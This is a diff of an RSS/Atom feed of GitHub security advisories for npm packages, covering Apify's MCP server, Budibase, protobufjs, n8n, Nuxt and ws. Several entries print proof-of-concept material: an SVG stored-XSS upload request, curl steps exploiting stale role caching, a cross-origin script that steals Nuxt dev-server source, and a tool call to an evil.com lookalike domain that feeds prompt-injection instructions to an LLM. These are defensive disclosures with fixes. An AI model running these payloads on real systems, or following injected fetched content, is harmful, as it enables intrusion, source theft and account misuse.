@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-05-19T14:17:36.125Z</updated>
+    <updated>2026-05-19T17:18:27.112Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -12,1314 +12,1278 @@
     <category term="MODERATE"/>
     <category term="LOW"/>
     <entry>
-        <title type="html"><![CDATA[[ws] ws: Uninitialized memory disclosure]]></title>
-        <id>https://github.com/advisories/GHSA-58qx-3vcg-4xpx</id>
-        <link href="https://github.com/advisories/GHSA-58qx-3vcg-4xpx"/>
-        <updated>2026-05-18T19:02:42.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <code>websocket.close()</code> implementation is vulnerable to uninitialized memory disclosure when a <code>TypedArray</code> is passed as the reason argument.</p>
-<h3 id="proof-of-concept">Proof of concept</h3>
-<pre><code class="language-js">import { deepStrictEqual } from 'node:assert';
-import { WebSocket, WebSocketServer } from 'ws';
-
-const wss = new WebSocketServer(
-  { port: 0, skipUTF8Validation: true },
-  function () {
-    const { port } = wss.address();
-    const ws = new WebSocket(`ws://localhost:${port}`, {
-      skipUTF8Validation: true
-    });
-
-    ws.on('close', function (code, reason) {
-      deepStrictEqual(reason, Buffer.alloc(80));
-    });
+        <title type="html"><![CDATA[[@apify/actors-mcp-server] Apify Model Context Protocol (MCP) server: Domain Allowlist Bypass in fetch-apify-docs via String Prefix Matching]]></title>
+        <id>https://github.com/advisories/GHSA-jwp7-wg77-3w9v</id>
+        <link href="https://github.com/advisories/GHSA-jwp7-wg77-3w9v"/>
+        <updated>2026-05-19T16:34:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The <code>fetch-apify-docs</code> tool validates URLs against a domain allowlist using <code>String.startsWith()</code> instead of proper URL hostname comparison. This allows bypass via attacker-controlled subdomains (e.g., <code>https://docs.apify.com.evil.com/</code>), enabling the tool to fetch and return arbitrary web content to the LLM.</p>
+<h3 id="details">Details</h3>
+<h4 id="vulnerable-component">Vulnerable component</h4>
+<p><code>src/tools/common/fetch_apify_docs.ts</code>, line 51:</p>
+<pre><code class="language-typescript">const isAllowedDomain = ALLOWED_DOC_DOMAINS.some((domain) =&gt; url.startsWith(domain));
+</code></pre>
+<p><code>src/const.ts</code>, lines 167-170:</p>
+<pre><code class="language-typescript">export const ALLOWED_DOC_DOMAINS = [
+    'https://docs.apify.com',
+    'https://crawlee.dev',
+] as const;
+</code></pre>
+<h4 id="how-the-bypass-works">How the bypass works</h4>
+<p><code>String.startsWith('https://docs.apify.com')</code> matches any string beginning with that prefix, including:</p>
+<ul>
+<li><code>https://docs.apify.com.evil.com/payload</code> - attacker-controlled subdomain</li>
+<li><code>https://docs.apify.com@evil.com/payload</code> - userinfo component in URL (browser behavior varies, but <code>fetch()</code> in Node.js may follow this)</li>
+<li><code>https://docs.apify.com.evil.com:8080/path</code> - custom port on attacker domain</li>
+</ul>
+<p>All of these pass the <code>startsWith</code> check because they begin with the exact string <code>https://docs.apify.com</code>.</p>
+<h4 id="the-fetched-content-is-returned-to-the-llm">The fetched content is returned to the LLM</h4>
+<p>After the allowlist check passes, the tool fetches the URL and returns the full page content as markdown (<code>fetch_apify_docs.ts:69-103</code>):</p>
+<pre><code class="language-typescript">const response = await fetch(url);
+// ...
+const html = await response.text();
+markdown = htmlToMarkdown(html);
+// ...
+return buildMCPResponse({ texts: [`Fetched content from ${url}:\n\n${markdown}`], ... });
+</code></pre>
+<p>The HTML is converted to markdown and returned verbatim to the LLM. This creates a prompt injection vector - the attacker's page can contain instructions that the LLM may follow.</p>
+<p>While tools like <code>get-html-skeleton</code> have no domain allowlist at all - it accepts any URL. The <code>fetch-apify-docs</code> tool was clearly intended to be more restricted (documentation-only), but the <code>startsWith</code> check defeats that intent.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-json">{
+  "method": "tools/call",
+  "params": {
+    "name": "fetch-apify-docs",
+    "arguments": {
+      "url": "https://docs.apify.com.evil.com/prompt-injection-payload"
+    }
   }
-);
+}
+</code></pre>
+<p>The URL passes the <code>startsWith('https://docs.apify.com')</code> check, fetches the attacker's page, and returns its content to the LLM.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Prompt injection via fetched content</strong>: Attacker hosts a page at <code>docs.apify.com.evil.com</code> containing LLM instructions. When the tool fetches and returns this content, the LLM may follow the injected instructions.</li>
+<li><strong>Security boundary violation</strong>: The allowlist was explicitly designed to restrict fetching to trusted documentation domains. The bypass defeats this intent.</li>
+<li><strong>SSRF (limited)</strong>: The tool can fetch from attacker-controlled servers, though the primary risk is the content returned to the LLM rather than network access.</li>
+<li><strong>Account compromise via _meta.apifyToken</strong>: Injected prompt instructions can direct the LLM to include a specific <code>_meta.apifyToken</code> (the server's per-request token feature) in subsequent <code>call-actor</code> invocations, redirecting billable operations to a victim's account or accessing their private Actors</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/apify/apify-mcp-server/security/advisories/GHSA-jwp7-wg77-3w9v">https://github.com/apify/apify-mcp-server/security/advisories/GHSA-jwp7-wg77-3w9v</a></li>
+<li><a href="https://github.com/advisories/GHSA-jwp7-wg77-3w9v">https://github.com/advisories/GHSA-jwp7-wg77-3w9v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jwp7-wg77-3w9v</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T16:34:34.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[budibase] Budibase: Unrestricted Upload of File with Dangerous Type]]></title>
+        <id>https://github.com/advisories/GHSA-82rc-gxrg-v4gf</id>
+        <link href="https://github.com/advisories/GHSA-82rc-gxrg-v4gf"/>
+        <updated>2026-05-19T16:31:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The file upload endpoint <code>POST /api/attachments/process</code> does not enforce active-content restrictions for authenticated users. The checks for dangerous file extensions (<code>html</code>, <code>svg</code>, <code>js</code>, <code>php</code>, etc.) are conditionally wrapped inside <code>if (isPublicUser)</code> or <code>if (isPublicUser || !env.SELF_HOSTED)</code>, meaning any authenticated builder can upload executable web content — SVG files with inline <code>&lt;script&gt;</code> tags, HTML pages with JavaScript, <code>.js</code> modules — which are then stored in the object store (MinIO/S3) with their correct MIME types (<code>image/svg+xml</code>, <code>text/html</code>, <code>application/javascript</code>). When the resulting signed URL is opened by any app user, the browser executes the payload.</p>
+<p>Impact is <strong>persistent stored XSS</strong> over all application end users.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability exists in a single handler function uploadFile shared by two routes, located in packages/server/src/api/controllers/static/index.ts (lines 93–179).</p>
+<p>Route definitions (packages/server/src/api/routes/static.ts):</p>
+<p>POST /api/attachments/process              → authorized(BUILDER)
+POST /api/attachments/:tableId/upload      → authorized(PermissionType.TABLE, PermissionLevel.WRITE)
+Both routes invoke the same uploadFile function. The second endpoint is accessible to any authenticated app user (BASIC or POWER role) who has been granted WRITE on any table — not just builders.</p>
+<h3 id="poc">PoC</h3>
+<h3 id="prerequisites">Prerequisites</h3>
+<ul>
+<li>Budibase self-hosted Docker deployment, any version ≤ 3.30.6</li>
+<li>An account with Builder role (does <strong>not</strong> require admin)</li>
+<li>Target app published and accessible to end users</li>
+</ul>
+<h3 id="step-1--authenticate-as-builder">Step 1 — Authenticate as builder</h3>
+<pre><code class="language-http">POST /api/global/auth/default/login HTTP/1.1
+Host: target:10000
+Content-Type: application/json
 
-wss.on('connection', function (ws) {
-  ws.close(1000, new Float32Array(20));
+{"username":"builder@company.com","password":"BuilderPass1!"}
+</code></pre>
+<pre><code>HTTP/1.1 200 OK
+Set-Cookie: budibase:auth=&lt;jwt&gt;; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT
+Set-Cookie: budibase:auth.sig=&lt;sig&gt;; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT
+
+{"message":"Login successful"}
+</code></pre>
+<p>The CSRF token is bound to the session. Browsers send it automatically via the Budibase
+frontend JS. For scripted requests, decode the JWT payload (base64url second segment) to
+extract <code>sessionId</code>, then read the Redis key <code>session-&lt;userId&gt;/&lt;sessionId&gt;</code> → <code>csrfToken</code>.</p>
+<h3 id="step-2--upload-svg-with-xss-payload">Step 2 — Upload SVG with XSS payload</h3>
+<pre><code class="language-http">POST /api/attachments/process HTTP/1.1
+Host: target:10000
+Cookie: budibase:auth=&lt;jwt&gt;; budibase:auth.sig=&lt;sig&gt;
+x-budibase-app-id: &lt;dev_app_id&gt;
+x-csrf-token: &lt;csrf_token&gt;
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXXXXXXXXXXXXXXX
+Content-Length: 391
+
+------WebKitFormBoundaryXXXXXXXXXXXXXXXX
+Content-Disposition: form-data; name="file"; filename="xss.svg"
+Content-Type: image/svg+xml
+
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/svg&gt;
+------WebKitFormBoundaryXXXXXXXXXXXXXXXX--
+</code></pre>
+<pre><code class="language-json">HTTP/1.1 200 OK
+
+[{"size":207,"name":"xss.svg","url":"http://target:10000/files/signed/.../&lt;uuid&gt;.svg?X-Amz-...","extension":"svg","key":"workspace_id/attachments/&lt;uuid&gt;.svg"}]
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>App end users - Stored XSS on any screen containing the attachment URL. Session cookie theft → full account takeover. |</li>
+<li>Builder accounts - If malicious URL is shared within the workspace (table attachment, embedded image), XSS fires in builder's session → workspace takeover.</li>
+</ul>
+<img src="https://github.com/user-attachments/assets/b0ee0263-85de-430e-9575-88ec91eae565" alt="image" height="1489" width="3087">
+
+
+<img src="https://github.com/user-attachments/assets/5133bb1e-f637-479e-952f-14b3265129b4" alt="image" height="1016" width="2100">
+
+
+
+
+
+
+
+<hr>
+<p>Discovered By:
+Abdulrahman Albatel
+Abdullah Alrasheed</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-82rc-gxrg-v4gf">https://github.com/Budibase/budibase/security/advisories/GHSA-82rc-gxrg-v4gf</a></li>
+<li><a href="https://github.com/Budibase/budibase/releases/tag/3.38.2">https://github.com/Budibase/budibase/releases/tag/3.38.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-82rc-gxrg-v4gf">https://github.com/advisories/GHSA-82rc-gxrg-v4gf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-82rc-gxrg-v4gf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-19T16:31:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@budibase/backend-core] Budibase: Missing Cache Invalidation on Public API Role Unassignment Allows Revoked Users to Retain Privileges for Up to 1 Hour]]></title>
+        <id>https://github.com/advisories/GHSA-6vp2-6r7m-2jvx</id>
+        <link href="https://github.com/advisories/GHSA-6vp2-6r7m-2jvx"/>
+        <updated>2026-05-19T16:30:38.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The public API role unassignment endpoint (<code>POST /api/public/v1/roles/unassign</code>) updates user documents in CouchDB but does not invalidate the corresponding Redis user cache entries. Because the authentication middleware resolves user identity and permissions from this cache (TTL: 3600 seconds), a user whose admin, builder, or app-level roles have been revoked via the public API retains those privileges for up to 1 hour.</p>
+<h2 id="details">Details</h2>
+<p>The root cause is an inconsistency between the <code>UserDB.save()</code> and <code>UserDB.bulkUpdate()</code> code paths.</p>
+<p><strong>Vulnerable path</strong> — <code>packages/pro/src/sdk/publicApi/roles.ts:49-75</code>:</p>
+<pre><code class="language-typescript">export async function unAssign(userIds: string[], opts: AssignmentOpts) {
+  // ... modifies user objects: deletes roles, admin, builder ...
+  await userDB.bulkUpdate(users)  // line 74
+}
+</code></pre>
+<p><code>bulkUpdate</code> delegates to <code>bulkUpdateGlobalUsers()</code> at <code>packages/backend-core/src/users/users.ts:82-85</code>:</p>
+<pre><code class="language-typescript">export async function bulkUpdateGlobalUsers(users: User[]) {
+  const db = getGlobalDB()
+  return (await db.bulkDocs(users)) as BulkDocsResponse
+}
+</code></pre>
+<p>This writes directly to CouchDB with <strong>no cache invalidation</strong>.</p>
+<p><strong>Correct path</strong> — <code>packages/backend-core/src/users/db.ts:355</code> (used by admin UI):</p>
+<pre><code class="language-typescript">await cache.user.invalidateUser(response.id)
+</code></pre>
+<p><strong>Cache configuration</strong> — <code>packages/backend-core/src/cache/user.ts:11</code>:</p>
+<pre><code class="language-typescript">const EXPIRY_SECONDS = 3600  // 1 hour TTL
+</code></pre>
+<p><strong>Authentication middleware</strong> — <code>packages/backend-core/src/middleware/authenticated.ts:153-160</code>:</p>
+<pre><code class="language-typescript">user = await getUser({
+  userId,
+  tenantId: session.tenantId,
+  email: session.email,
+})
+</code></pre>
+<p><code>getUser()</code> reads from Redis cache first; it only falls back to CouchDB on cache miss. After <code>unAssign</code> updates CouchDB without invalidating Redis, every authenticated request continues to use the stale cached user object with the old (revoked) privileges.</p>
+<p>Notably, other bulk operations in the codebase handle this correctly — <code>groups.addUsers()</code> and <code>groups.removeUsers()</code> in <code>packages/pro/src/sdk/groups/groups.ts</code> both loop through affected users and call <code>cache.user.invalidateUser()</code> after <code>bulkUpdateGlobalUsers()</code>. The public API roles path was missed.</p>
+<h2 id="poc">PoC</h2>
+<pre><code class="language-bash"># Prerequisites: Enterprise license, admin API key, a second user with admin role
+
+# Step 1: Confirm user has admin access
+curl -s -X GET http://localhost:10000/api/global/roles \
+  -H 'Cookie: budibase:auth=&lt;target-user-session&gt;' \
+  -H 'x-budibase-app-id: app_xyz'
+# Returns 200 with roles list
+
+# Step 2: Revoke admin role via public API
+curl -s -X POST http://localhost:10000/api/public/v1/roles/unassign \
+  -H 'x-budibase-api-key: &lt;admin-api-key&gt;' \
+  -H 'Content-Type: application/json' \
+  -d '{"userIds": ["&lt;target-user-id&gt;"], "admin": true}'
+# Returns 200 — role removed from CouchDB
+
+# Step 3: Verify DB was updated (admin field removed)
+# (check CouchDB directly - user document no longer has admin: {global: true})
+
+# Step 4: Immediately retry admin endpoint as revoked user
+curl -s -X GET http://localhost:10000/api/global/roles \
+  -H 'Cookie: budibase:auth=&lt;target-user-session&gt;' \
+  -H 'x-budibase-app-id: app_xyz'
+# STILL returns 200 — stale cache serves old admin privileges
+
+# Step 5: Wait for cache expiry (up to 3600 seconds) and retry
+# After cache expires, the request correctly returns 403
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>A user whose admin, builder, or app-level roles have been revoked via the public API retains full access to those privileges for up to 1 hour. This is particularly concerning in automated offboarding scenarios where HR/IT systems use the public API to revoke access for terminated employees — the terminated user retains admin/builder access to all applications and data during the cache window.</p>
+<p>The impact is bounded by:</p>
+<ul>
+<li>Requires enterprise license (expanded public API feature)</li>
+<li>Maximum 1-hour window before cache expires</li>
+<li>Only affects the public API revocation path; revocations via the admin UI (<code>UserDB.save()</code>) invalidate cache correctly</li>
+<li>The <code>assign</code> direction has the inverse issue (newly granted roles are delayed) but this is less security-critical</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Add cache invalidation to <code>bulkUpdateGlobalUsers</code> or to the callers that need it. The most targeted fix is in the <code>unAssign</code> function:</p>
+<pre><code class="language-typescript">// packages/pro/src/sdk/publicApi/roles.ts
+import { cache } from "@budibase/backend-core"
+
+export async function unAssign(userIds: string[], opts: AssignmentOpts) {
+  // ... existing role removal logic ...
+  await userDB.bulkUpdate(users)
+  
+  // Invalidate cache for all affected users
+  await Promise.all(
+    users.map(user =&gt; cache.user.invalidateUser(user._id!))
+  )
+}
+</code></pre>
+<p>Alternatively, fix it at the <code>bulkUpdate</code> level to prevent future callers from having the same gap:</p>
+<pre><code class="language-typescript">// packages/backend-core/src/users/db.ts
+static async bulkUpdate(users: User[]) {
+  const result = await usersCore.bulkUpdateGlobalUsers(users)
+  await Promise.all(
+    users.map(user =&gt; cache.user.invalidateUser(user._id!))
+  )
+  return result
+}
+</code></pre>
+<p>The same fix should also be applied to the <code>assign</code> function in the same file.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-6vp2-6r7m-2jvx">https://github.com/Budibase/budibase/security/advisories/GHSA-6vp2-6r7m-2jvx</a></li>
+<li><a href="https://github.com/Budibase/budibase/releases/tag/3.38.2">https://github.com/Budibase/budibase/releases/tag/3.38.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-6vp2-6r7m-2jvx">https://github.com/advisories/GHSA-6vp2-6r7m-2jvx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6vp2-6r7m-2jvx</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T16:30:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[protobufjs] protobufjs: Denial of Service via unbounded recursive JSON descriptor expansion]]></title>
+        <id>https://github.com/advisories/GHSA-jggg-4jg4-v7c6</id>
+        <link href="https://github.com/advisories/GHSA-jggg-4jg4-v7c6"/>
+        <updated>2026-05-19T16:21:36.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>protobufjs could recurse without a depth limit while expanding nested JSON descriptors through <code>Root.fromJSON()</code> and <code>Namespace.addJSON()</code>.</p>
+<p>A crafted JSON descriptor with deeply nested namespace definitions could cause the JavaScript call stack to be exhausted during descriptor loading.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker who can provide JSON descriptors loaded by an application may be able to crash the process or otherwise cause schema loading to fail with a stack overflow.</p>
+<p>This affects applications that load JSON descriptors from untrusted sources with affected versions.</p>
+<h2 id="preconditions">Preconditions</h2>
+<ul>
+<li>The application must load JSON descriptor data influenced by an attacker.</li>
+<li>The crafted descriptor must contain deeply nested <code>nested</code> namespace objects.</li>
+<li>The affected <code>Root.fromJSON()</code> / <code>Namespace.addJSON()</code> descriptor expansion path must process the crafted input.</li>
+</ul>
+<h2 id="workarounds">Workarounds</h2>
+<p>Avoid loading untrusted protobuf JSON descriptors with affected versions. If immediate upgrade is not possible, reject excessively nested descriptor structures at an outer validation boundary where feasible, or isolate descriptor loading in a process that can be safely restarted.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-jggg-4jg4-v7c6">https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-jggg-4jg4-v7c6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45740">https://nvd.nist.gov/vuln/detail/CVE-2026-45740</a></li>
+<li><a href="https://github.com/advisories/GHSA-jggg-4jg4-v7c6">https://github.com/advisories/GHSA-jggg-4jg4-v7c6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jggg-4jg4-v7c6</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T16:21:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[protobufjs] protobufjs: Denial of Service via unbounded recursive JSON descriptor expansion]]></title>
+        <id>https://github.com/advisories/GHSA-jggg-4jg4-v7c6</id>
+        <link href="https://github.com/advisories/GHSA-jggg-4jg4-v7c6"/>
+        <updated>2026-05-19T16:21:36.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>protobufjs could recurse without a depth limit while expanding nested JSON descriptors through <code>Root.fromJSON()</code> and <code>Namespace.addJSON()</code>.</p>
+<p>A crafted JSON descriptor with deeply nested namespace definitions could cause the JavaScript call stack to be exhausted during descriptor loading.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker who can provide JSON descriptors loaded by an application may be able to crash the process or otherwise cause schema loading to fail with a stack overflow.</p>
+<p>This affects applications that load JSON descriptors from untrusted sources with affected versions.</p>
+<h2 id="preconditions">Preconditions</h2>
+<ul>
+<li>The application must load JSON descriptor data influenced by an attacker.</li>
+<li>The crafted descriptor must contain deeply nested <code>nested</code> namespace objects.</li>
+<li>The affected <code>Root.fromJSON()</code> / <code>Namespace.addJSON()</code> descriptor expansion path must process the crafted input.</li>
+</ul>
+<h2 id="workarounds">Workarounds</h2>
+<p>Avoid loading untrusted protobuf JSON descriptors with affected versions. If immediate upgrade is not possible, reject excessively nested descriptor structures at an outer validation boundary where feasible, or isolate descriptor loading in a process that can be safely restarted.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-jggg-4jg4-v7c6">https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-jggg-4jg4-v7c6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45740">https://nvd.nist.gov/vuln/detail/CVE-2026-45740</a></li>
+<li><a href="https://github.com/advisories/GHSA-jggg-4jg4-v7c6">https://github.com/advisories/GHSA-jggg-4jg4-v7c6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jggg-4jg4-v7c6</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T16:21:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[n8n] n8n: Credential exfiltration via Allowed HTTP Request Domains Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-3875-8gcx-7v46</id>
+        <link href="https://github.com/advisories/GHSA-3875-8gcx-7v46"/>
+        <updated>2026-05-19T16:17:44.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>The <code>POST /rest/dynamic-node-parameters/options</code> endpoint allowed any authenticated user to cause the n8n server to issue HTTP requests including credentials bypassing the intended restrictions on which hosts could be contacted for that credential (Allowed HTTP Request Domains). The user needed to be authenticated and have access to the credential.</p>
+<h2 id="patches">Patches</h2>
+<p>The issue has been fixed in n8n version 2.20.0. Users should upgrade to this version or later to remediate the vulnerability.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
+<ul>
+<li>Restrict n8n access to fully trusted users only.</li>
+<li>Limit credential sharing to users who genuinely require access to those credentials.</li>
+</ul>
+<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-3875-8gcx-7v46">https://github.com/n8n-io/n8n/security/advisories/GHSA-3875-8gcx-7v46</a></li>
+<li><a href="https://github.com/advisories/GHSA-3875-8gcx-7v46">https://github.com/advisories/GHSA-3875-8gcx-7v46</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3875-8gcx-7v46</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T16:17:43.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[n8n] n8n: Legacy ExecuteWorkflow Node Bypassed File Path Restrictions]]></title>
+        <id>https://github.com/advisories/GHSA-2vx9-7wpg-88jq</id>
+        <link href="https://github.com/advisories/GHSA-2vx9-7wpg-88jq"/>
+        <updated>2026-05-19T15:55:44.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>The <code>ExecuteWorkflow</code> node's <code>localFile</code> source option read workflow files from disk without applying checks enforced by other file-reading nodes. An authenticated user with permission to create or modify workflows could supply an arbitrary file path via the REST API, bypassing the <code>N8N_RESTRICT_FILE_ACCESS_TO</code> restriction. This allowed the attacker to determine whether arbitrary files exist on the server host. Where the targeted path contained a valid workflow JSON file, the file could additionally be loaded and executed, potentially triggering actions on downstream systems connected to that workflow.</p>
+<p>The <code>localFile</code> source option is hidden from the n8n UI since v1.2 but remains accessible via the REST API.</p>
+<h2 id="patches">Patches</h2>
+<p>The issue has been fixed in n8n version 2.20.0 or 2.19.3. Users should upgrade to this version or later to remediate the vulnerability.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
+<ul>
+<li>Restrict workflow creation and editing permissions to fully trusted users only.</li>
+<li>Restrict network access to the n8n REST API to trusted users only.</li>
+</ul>
+<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-2vx9-7wpg-88jq">https://github.com/n8n-io/n8n/security/advisories/GHSA-2vx9-7wpg-88jq</a></li>
+<li><a href="https://github.com/advisories/GHSA-2vx9-7wpg-88jq">https://github.com/advisories/GHSA-2vx9-7wpg-88jq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2vx9-7wpg-88jq</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T15:55:43.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@nuxt/webpack-builder] Nuxt: Dev server exposes built source over LAN to malicious sites (incomplete fix for GHSA-4gf7-ff8x-hq99)]]></title>
+        <id>https://github.com/advisories/GHSA-6m52-m754-pw2g</id>
+        <link href="https://github.com/advisories/GHSA-6m52-m754-pw2g"/>
+        <updated>2026-05-19T15:51:17.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>This is an incomplete fix for <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a>. Source code may be stolen during dev when using the webpack / rspack builder if the dev server is bound to a non-loopback address (e.g. <code>nuxt dev --host</code>) and the developer opens a malicious site on the same network.</p>
+<h3 id="details">Details</h3>
+<p>The fix for <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a> relied on Sec-Fetch-Mode and Sec-Fetch-Site headers. Because <a href="https://w3c.github.io/webappsec-fetch-metadata/#sec-fetch-site-header:~:text=Site%20header%20for%20a%20request%20r%3A-,Assert%3A%20r%E2%80%99s%20url%20is%20a%20potentially%20trustworthy%20URL.,-Let%20header%20be%20a%20Structured%20Field%20whose">these headers are sent by the browsers only for potentially trustworthy origins</a>, the check is able to bypass for non-potentially trustworthy origins.</p>
+<p>Since the attack requires the website to be accessible via a non-potentially trustworthy origin, only apps that are using <code>--host</code> is affected.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a nuxt project with webpack / rspack builder.</li>
+<li>Run <code>npm run dev</code></li>
+<li>Open <code>http://localhost:3000</code></li>
+<li>Run the script below in a web site that has a different origin.</li>
+<li>You can see the source code output in the document and the devtools console.</li>
+</ol>
+<pre><code class="language-js">const script = document.createElement('script')
+script.src = 'http://192.168.0.31:3000/_nuxt/app.js' // NOTE: replace with the IP address the dev server listens to
+script.addEventListener('load', () =&gt; {
+  const key = Object.keys(window).find(k =&gt; k.startsWith("webpackChunk"))
+  for (const page in window[key]) {
+    const moduleList = window[key][page][1]
+    console.log(moduleList)
+
+    for (const key in moduleList) {
+      const p = document.createElement('p')
+      const title = document.createElement('strong')
+      title.textContent = key
+      const code = document.createElement('code')
+      code.textContent = moduleList[key].toString()
+      p.append(title, ':', document.createElement('br'), code)
+      document.body.appendChild(p)
+    }
+  }
+})
+document.head.appendChild(script)
+</code></pre>
+<p>(This script is the similar with <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a> except for the <code>script.src</code> and the global variable name)</p>
+<h3 id="impact">Impact</h3>
+<p>Users using webpack / rspack builder may get the source code stolen by malicious websites if it uses a predictable host and also is using <code>--host</code>.</p>
+<p>This vulnerability does not affect Chrome 142+ (and other Chromium based browsers) users due to <a href="https://developer.chrome.com/release-notes/142#local_network_access_restrictions">the local network access restriction feature</a>.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>nuxt@4.4.6</code> and <code>nuxt@3.21.6</code> by <a href="https://github.com/nuxt/nuxt/pull/35051">#35051</a>. The dev-middleware same-origin check now falls back to comparing the request's <code>Origin</code> / <code>Referer</code> host against <code>Host</code> when <code>Sec-Fetch-*</code> headers are absent, closing the non-trustworthy-origin bypass.</p>
+<p>The fix only ships for the <code>@nuxt/webpack-builder</code> and <code>@nuxt/rspack-builder</code> packages. The default Vite builder was not affected.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If you cannot upgrade immediately:</p>
+<ul>
+<li>Don't use <code>nuxt dev --host</code>. Bind the dev server to <code>localhost</code> (the default) and tunnel from other devices via SSH or a reverse proxy that enforces same-origin checks.</li>
+<li>Use Chrome 142+ or another Chromium-based browser that enforces <a href="https://developer.chrome.com/release-notes/142#local_network_access_restrictions">local network access restrictions</a>.</li>
+<li>Switch to the Vite builder for development.</li>
+</ul>
